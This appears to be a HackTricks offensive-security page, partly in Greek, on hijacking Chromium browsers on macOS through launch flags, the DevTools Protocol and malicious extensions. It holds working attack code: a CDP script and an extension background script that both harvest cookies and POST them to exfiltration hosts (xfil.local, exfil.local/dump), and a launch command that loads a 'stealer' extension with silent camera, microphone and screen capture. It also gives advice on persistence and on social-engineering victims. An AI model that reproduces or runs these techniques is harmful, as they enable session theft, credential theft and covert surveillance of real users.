# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera all consume the same command-line switches, preference files, and DevTools automation interfaces. Στο macOS, οποιοσδήποτε χρήστης με πρόσβαση GUI μπορεί να τερματίσει μια υπάρχουσα συνεδρία browser και να την ανοίξει ξανά με αυθαίρετα flags, extensions, ή DevTools endpoints που τρέχουν με τα entitlements του στόχου.

#### Launching Chromium with custom flags on macOS

Το macOS διατηρεί μια μόνο UI instance ανά προφίλ Chromium, οπότε η instrumentation συνήθως απαιτεί τον αναγκαστικό τερματισμό του browser (για παράδειγμα με `osascript -e 'tell application "Google Chrome" to quit'`). Οι επιτιθέμενοι τυπικά επανεκκινούν μέσω `open -na "Google Chrome" --args <flags>` ώστε να εγχύσουν arguments χωρίς να τροποποιήσουν το app bundle. Η τοποθέτηση αυτής της εντολής μέσα σε έναν user LaunchAgent (`~/Library/LaunchAgents/*.plist`) ή login hook διασφαλίζει ότι ο παραποιημένος browser θα επανεκκινήσει μετά από reboot/logoff.

#### `--load-extension` Flag

Το `--load-extension` flag φορτώνει αυτόματα unpacked extensions (comma-separated paths). Συνδυάστε το με `--disable-extensions-except` για να μπλοκάρετε νόμιμες επεκτάσεις ενώ αναγκάζετε να τρέξει μόνο το payload σας. Κακόβουλες επεκτάσεις μπορούν να ζητήσουν permissions υψηλού αντίκτυπου όπως `debugger`, `webRequest`, και `cookies` για να μεταβούν σε DevTools protocols, να τροποποιήσουν CSP headers, να υποβαθμίσουν HTTPS, ή να εξάγουν session δεδομένα αμέσως μόλις ο browser εκκινήσει.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Αυτά τα switches εκθέτουν το Chrome DevTools Protocol (CDP) πάνω από TCP ή pipe ώστε εξωτερικά εργαλεία να ελέγχουν τον browser. Η Google παρατήρησε ευρεία κατάχρηση από infostealers αυτής της διεπαφής και, ξεκινώντας με το Chrome 136 (Μάρτιος 2025), τα switches αγνοούνται για το default profile εκτός αν ο browser εκκινήσει με μη-τυπικό `--user-data-dir`. Αυτό επιβάλλει App-Bound Encryption σε πραγματικά προφίλ, αλλά οι επιτιθέμενοι μπορούν ακόμα να δημιουργήσουν νέο προφίλ, να εξαναγκάσουν το θύμα να αυθεντικοποιηθεί μέσα σε αυτό (phishing/triage assistance), και να συλλέξουν cookies, tokens, device trust states, ή WebAuthn registrations μέσω CDP.

#### `--user-data-dir` Flag

Αυτό το flag ανακατευθύνει ολόκληρο το browser profile (History, Cookies, Login Data, Preference files, κ.λπ.) σε ένα path ελεγχόμενο από τον επιτιθέμενο. Είναι υποχρεωτικό όταν συνδυάζεται σύγχρονη έκδοση Chrome με `--remote-debugging-port`, και κρατάει το παραποιημένο profile απομονωμένο ώστε να μπορείτε να τοποθετήσετε προ-συμπληρωμένα `Preferences` ή `Secure Preferences` αρχεία που απενεργοποιούν security prompts, εγκαθιστούν extensions αυτόματα, και αλλάζουν default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Αυτό το switch παρακάμπτει το camera/mic permission prompt έτσι οποιαδήποτε σελίδα καλεί `getUserMedia` λαμβάνει πρόσβαση αμέσως. Συνδυάστε το με flags όπως `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, ή CDP `Browser.grantPermissions` commands για να καταγράψετε σιωπηρά audio/video, desk-share, ή να ικανοποιήσετε WebRTC permission checks χωρίς αλληλεπίδραση χρήστη.

## Remote Debugging & DevTools Protocol Abuse

Αφού το Chrome επανεκκινηθεί με ένα αφιερωμένο `--user-data-dir` και `--remote-debugging-port`, μπορείτε να συνδεθείτε μέσω CDP (π.χ., μέσω `chrome-remote-interface`, `puppeteer`, ή `playwright`) και να αυτοματοποιήσετε workflows με υψηλά προνόμια:

- **Cookie/session theft:** `Network.getAllCookies` και `Storage.getCookies` επιστρέφουν HttpOnly τιμές ακόμα και όταν το App-Bound encryption κανονικά θα μπλόκαρε την πρόσβαση στο filesystem, επειδή το CDP ζητά από τον τρέχοντα browser να τις αποκρυπτογραφήσει.
- **Permission tampering:** `Browser.grantPermissions` και `Emulation.setGeolocationOverride` σας επιτρέπουν να παρακάμψετε camera/mic prompts (ειδικά σε συνδυασμό με `--use-fake-ui-for-media-stream`) ή να πλαστογραφήσετε ελέγχους ασφαλείας βασισμένους στη θέση.
- **Keystroke/script injection:** `Runtime.evaluate` εκτελεί αυθαίρετο JavaScript μέσα στην ενεργή καρτέλα, επιτρέποντας την ανάκτηση διαπιστευτηρίων, το πάτσάρισμα του DOM, ή την έγχυση persistence beacons που επιβιώνουν κατά την πλοήγηση.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` και `Fetch.enable` υποκλέπτουν authenticated requests/responses σε πραγματικό χρόνο χωρίς να ακουμπάνε αρχεία στο δίσκο.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## Έγχυση μέσω Extension με Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (extensions stay in their context) and enables:

- Σιωπηλή κλοπή cookies και credentials με `Network.getAllCookies`/`Fetch.getResponseBody`.
- Τροποποίηση αδειών ιστότοπου (camera, microphone, geolocation) και παράκαμψη security interstitial, επιτρέποντας σε phishing pages να μιμηθούν διαλόγους του Chrome.
- Παρεμβολή on-path σε προειδοποιήσεις TLS, downloads ή WebAuthn prompts με προγραμματισμένο χειρισμό των `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ή `Security.handleCertificateError`.

Load the extension with `--load-extension`/`--disable-extensions-except` so no user interaction is required. A minimal background script that weaponizes the API looks like this:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Η επέκταση μπορεί επίσης να εγγραφεί στα events `Debugger.paused` για να διαβάζει μεταβλητές JavaScript, να επιδιορθώνει inline scripts, ή να τοποθετεί custom breakpoints που επιβιώνουν μετά την πλοήγηση. Επειδή όλα εκτελούνται μέσα στη GUI session του χρήστη, Gatekeeper και TCC δεν ενεργοποιούνται, καθιστώντας αυτήν την τεχνική ιδανική για malware που έχει ήδη καταφέρει εκτέλεση στο πλαίσιο του χρήστη.

### Εργαλεία

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Αυτοματοποιεί τις εκκινήσεις του Chromium με payload extensions και εκθέτει διαδραστικά CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Παρόμοια εργαλεία επικεντρωμένα σε traffic interception και browser instrumentation για macOS operators.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Βιβλιοθήκη Node.js για scripting Chrome DevTools Protocol dumps (cookies, DOM, permissions) μόλις ένα instance με `--remote-debugging-port` είναι ενεργό.

### Παράδειγμα
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Βρείτε περισσότερα παραδείγματα στους συνδέσμους των tools.

## Αναφορές

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
